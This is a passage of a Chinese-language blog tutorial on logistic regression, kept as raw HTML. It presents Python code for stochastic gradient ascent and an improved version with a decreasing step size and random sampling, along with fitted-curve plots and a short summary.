class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef76c082557243-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef76c082557243-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef76c082557243-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef76c082557243-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef76c082557243-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef76c082557243-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef76c082557243-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef76c082557243-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">stocGradAscent0</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMatrix</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">classLabels</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef76c082557243-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">shape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMatrix</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef76c082557243-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">alpha</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.01</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef76c082557243-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">weights</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ones</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">   </span><span class=\"crayon-p\">#initialize to all ones</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef76c082557243-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef76c082557243-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sigmoid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMatrix</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">weights</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef76c082557243-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">error</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">classLabels</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">h</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef76c082557243-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">weights</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weights</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">alpha *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">error *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mat</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMatrix</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">transpose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef76c082557243-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weights</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>每一次迭代计算回归系数时，只使用样本空间中的一个样本点来计算。我们通过程序生成一个样本散点和拟合曲线的图来看一下这个算法的准确程度：</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fm60luh3ndj20hs0dcdg5.jpg\" width=\"640\" height=\"480\"></p>\n<p>不难看出跟之前的算法相差还是比较大的。原因是之前的算法是通过500次迭代算出的结果，后者只经过了100次迭代。那么这里要说明的问题是，回归系数在随着迭代次数的增加是趋于收敛的，并且收敛的过程是存在波动的。说白了，就是迭代的次数越多，越接近我们想要的那个值，但是由于样本的数据是非线性的，这个过程也会有一定的误差。具体的回归系数和迭代次数的关系大家可以参考一些教材，例如《机器学习实战》中的描述，这里就不做详细介绍了。<br>\n我们这里只介绍一下如何改进我们的算法，使我们的算法能够快速的收敛并减小波动。方法如下：</p>\n<ul>\n<li>每次迭代随机的抽取一个样本点来计算回归向量</li>\n<li>迭代的步长随着迭代次数增大而不断减少，但是永远不等于0</li>\n</ul>\n<p>改进代码，并打印出拟合曲线和样本散点图：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a0cef771745749047\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef stocGradAscent1(dataMatrix, classLabels, numIter=150):\r\n    m,n = shape(dataMatrix)\r\n    weights = ones((n,1))   #initialize to all ones\r\n    for j in range(numIter):\r\n        dataIndex = range(m)\r\n        for i in range(m):\r\n            alpha = 4/(1.0+j+i)+0.0001    #apha decreases with iteration, does not \r\n            randIndex = int(random.uniform(0,len(dataIndex)))#go to 0 because of the constant\r\n            h = sigmoid(sum(dataMatrix[randIndex]*weights))\r\n            error = classLabels[randIndex] - h\r\n            weights = weights + alpha * error * mat(dataMatrix[randIndex]).transpose()\r\n            del(dataIndex[randIndex])\r\n    return weights\r\nif __name__=='__main__':\r\n    dataMat,labelMat=loadDataSet()\r\n    #weights=stocGradAscent0(dataMat,labelMat)\r\n    weights=stocGradAscent1(dataMat,labelMat)\r\n    #weights=gradAscent(dataMat,labelMat)\r\n    #print 'dataMat:\\n',dataMat\r\n    #print 'labelMat:\\n',labelMat\r\n    #print '回归系数：\\n',weights\r\n    plotBestFit(weights)\r\n    #testClassify0()</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef771745749047-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef771745749047-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef771745749047-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef771745749047-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef771745749047-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef771745749047-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef771745749047-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef771745749047-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef771745749047-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef771745749047-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef771745749047-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef771745749047-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef771745749047-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef771745749047-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef771745749047-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef771745749047-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef771745749047-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef771745749047-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef771745749047-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef771745749047-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef771745749047-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef771745749047-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef771745749047-23\">23</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef771745749047-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">stocGradAscent1</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMatrix</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">classLabels</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numIter</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">150</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef771745749047-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">shape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMatrix</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef771745749047-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">weights</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ones</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">   </span><span class=\"crayon-p\">#initialize to all ones</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef771745749047-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">numIter</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef771745749047-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">dataIndex</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef771745749047-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef771745749047-7\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">alpha</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">0.0001</span><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#apha decreases with iteration, does not </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef771745749047-8\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">randIndex</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">uniform</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataIndex</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-p\">#go to 0 because of the constant</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef771745749047-9\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sigmoid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">sum</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMatrix</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">randIndex</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">weights</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef771745749047-10\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">error</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">classLabels</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">randIndex</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">h</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef771745749047-11\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">weights</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weights</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">alpha *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">error *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mat</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMatrix</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">randIndex</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">transpose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef771745749047-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">del</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataIndex</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">randIndex</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef771745749047-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">weights</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef771745749047-14\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">__name__</span><span class=\"crayon-o\">==</span><span class=\"crayon-s\">'__main__'</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef771745749047-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">loadDataSet</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef771745749047-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#weights=stocGradAscent0(dataMat,labelMat)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef771745749047-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">weights</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">stocGradAscent1</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMat</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">labelMat</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef771745749047-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#weights=gradAscent(dataMat,labelMat)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef771745749047-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#print 'dataMat:\\n',dataMat</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef771745749047-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#print 'labelMat:\\n',labelMat</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef771745749047-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#print '回归系数：\\n',weights</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef771745749047-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">plotBestFit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">weights</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef771745749047-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\">#testClassify0()</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0043 seconds] -->\r\n<p>默认是150迭代的样本散点图和拟合曲线图：</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fm60lutip0j20hs0dcjrk.jpg\" width=\"640\" height=\"480\"></p>\n<p>不难看出准确程度与第一个算法很接近了！</p>\n<h2 id=\"title-5\">五、总结</h2>\n<p>Logistic回归算法主要是利用了Sgimoid函数来为数据分类，分类的准确的关键取决于从样本空间中计算出的回归系数。我们使用梯度上升法来计算回归系数，并采用随机梯度上升法来改进了算法的性能。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113182\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113182votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113182\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
